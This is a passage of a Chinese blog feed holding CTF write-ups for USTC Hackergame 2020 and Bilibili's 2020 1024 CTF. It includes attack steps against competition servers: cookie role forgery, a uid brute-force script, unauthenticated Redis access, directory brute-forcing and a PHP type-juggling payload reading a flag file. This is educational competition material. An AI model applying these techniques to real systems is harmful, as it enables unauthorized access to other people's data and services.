1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\">\n<div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-11-06</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\">\n<div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-25</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a 